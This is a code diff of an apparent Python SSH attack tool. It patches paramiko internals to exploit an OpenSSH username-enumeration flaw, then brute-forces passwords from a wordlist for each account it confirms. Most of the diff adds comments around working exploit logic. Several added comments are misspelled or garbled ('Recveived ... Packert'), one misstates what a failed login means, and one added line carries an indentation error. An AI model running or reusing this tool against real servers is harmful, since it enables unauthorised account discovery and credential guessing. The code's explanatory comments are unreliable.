@@ -14,7 +14,7 @@ from random import choice as choice
 global hostname, username, port, password_file
 
 def exploit(hostname, username, port, validuser = ""):
-    # store function we will overwrite to malform the packet
+    # store function we will overwrite to Recveived MSG_SERVICE_ACCEPT Packets
     old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 
@@ -27,12 +27,12 @@ def exploit(hostname, username, port, validuser = ""):
         random_username_list.append(user)
 
 
-    # create custom exception
+    # create custom exception that is triggered after MSG_SERVICE_FAILURE
     class BadUsername(Exception):
         def __init__(self):
             pass
 
-    # create malicious "add_boolean" function to malform packet
+    # create malicious "add_boolean" function to Recveived MSG_SERVICE_ACCEPT Packert
     def add_boolean(*args, **kwargs):
         pass
         
@@ -56,10 +56,9 @@ def exploit(hostname, username, port, validuser = ""):
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
     # get rid of paramiko logging
-    ######CHECK WHAT THIS DOES, IS IT REDUNDANT?#######
-    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+     logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
     
-    # create function to perform authentication with malformed packet and desired username
+    # create function to perform authentication with malformed MSG_SERVICE_ACCEPT Received packet and desired username
     def checkUsername(username, tried=0):
         sock = socket.socket()
         sock.connect((hostname, port))
@@ -79,15 +78,17 @@ def exploit(hostname, username, port, validuser = ""):
         try:
             transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
         except BadUsername:
+                #Exception for if MSG_SERVICE_ACCEPT is sent back
                 return (username, False)
                 
         except paramiko.ssh_exception.AuthenticationException:
+                #Exception for if the server function crashes meaning the username is true
                 return (username, True)
                 
         #Successful auth(?)
         raise Exception("There was an error. Is this the correct version of OpenSSH?"+ Style.RESET_ALL)
     
-    # function to test target system using the randomly generated usernames
+    # function to test to see if a Target Machine is Vulnerable
     def checkVulnerable():
         vulnerable = True
         for user in random_username_list:
@@ -96,6 +97,7 @@ def exploit(hostname, username, port, validuser = ""):
                 vulnerable = False
         return vulnerable
 
+    #Tries to connect with a standard socket, Similar to if we just run NC against the target machine
     sock = socket.socket()
     try:
         sock.connect((hostname, port))
@@ -104,12 +106,13 @@ def exploit(hostname, username, port, validuser = ""):
         print('[-] Connecting to host failed. Please check the specified host and port.'+ Style.RESET_ALL)
         sys.exit(1)
 
-    # first we run the function to check if host is vulnerable to this CVE
+    #Check if the host is vulnerable to this CVE
     if not checkVulnerable():
         # most probably the target host is either patched or running a version not affected by this CVE
         print("[-] Target host most probably is not vulnerable or already patched, exiting..."+ Style.RESET_ALL)
         sys.exit(0)
     elif username:
+        #Prints the results of the exploit function itself before exiting
         result = checkUsername(username)
         if result[1]:
             print(Fore.BLUE+ "[+] User: " + result[0]+" => is a valid user" + Style.RESET_ALL)
@@ -118,7 +121,8 @@ def exploit(hostname, username, port, validuser = ""):
             print(Fore.YELLOW+ "[*] User: " + result[0]+" => is not a valid user" + Style.RESET_ALL)
 
     
-    #Restore Paramiko to defaults
+    #Restore Paramiko to defaults so that a normal connection can be establissed for password testing, without this function the CVE Function continues 
+    #Which causes unexpected behavior
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] =  old_SERVICE_ACCEPT
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = old_USERAUTH_FAILURE
 
@@ -126,7 +130,7 @@ def exploit(hostname, username, port, validuser = ""):
     return(validuser)
     
 
-
+#Conducts a Standard Paramiko SSH Connection with a username, password and port.
 def ssh_connect(hostname, port, username, password, code = 0):
     ssh2 = paramiko.SSHClient()
     ssh2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -172,41 +176,50 @@ aa    ]8I "8a,   ,a88 "8a,   ,a8" 88b,   ,a8" "8b,   ,aa
                     V1.0.5
           ASCII Art Credit ascii.co.uk
                                             """)
-    
+    #Checks to makesure the passed in userfile extits in the filesystem then stores it into an array
     if args.userfile:
         if os.path.exists(args.userfile) == False:
             print(Fore.RED + "[-] Username Filepath: " +args.userfile  +" Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
             sys.exit(3)
         else:
             lineuser = [line.strip("\n") for line in open(args.userfile,'r')]
+    #Uses a single username argument
     elif args.username:
         lineuser = [args.username]
+    #Checks to see if the passed in PassFile exists in the filesystem then stores it into an array
     if args.passfile:
         if os.path.exists(args.passfile) == False:
             print(Fore.RED + "[-] Password Filepath: " +args.passfile + " Does Not Exist. Exiting Now..."+ Style.RESET_ALL)
             sys.exit(3)
         else:
             linepassword = [line.strip("\n") for line in open(args.passfile,'r')]
+    #Uses a single Password argument 
     elif args.password:
         linepassword = [args.password]
-
+    #Once the arrays or single user has been checked we go through and do the exploit, then for each valid user we conduct a password test
     for user in lineuser:
+        #Checks to see if the user is valid
         validuser = exploit(args.hostname, user, args.port)
         if validuser !="":
+            #if the user exists from the exploit, we start testing passwords
             for password in linepassword:                             
                 try:
+                    #if the password actually connects, we have found the password, so we will break and go back to the next user in the array
                     response = ssh_connect(args.hostname, args.port, validuser, password)                
                     if response == 0:
                         print(Fore.GREEN + "[+] User: %s [+] Pass Found: %s" % (validuser, password)+ Style.RESET_ALL)
                         break
+                    #if the ssh connection fails, the user is invalid, so we continue through the next password in the array
                     elif response == 1 and args.suppress == False:
                         print(Fore.RED + "[/] User: %s [/] Pass: %s => Login Incorrect!!! <=" % (validuser, password)+ Style.RESET_ALL)  
+                    #This should have already been tested, but just in case we have error checking here as well
                     elif response == 2:
                         print("[-] Connnection could not be established to the address: %s" % (args.hostname))
                         sys.exit(2)
                 except Exception as ex:
                     print (ex)
-                    pass            
+                    pass 
+#If the user conducts a Control and C interupt so a message is displayed, and we exit gracefully.
 except KeyboardInterrupt:
     print("\n\n[-] User Requested An Interupt. Exiting Now..."+ Style.RESET_ALL)
     sys.exit(4)
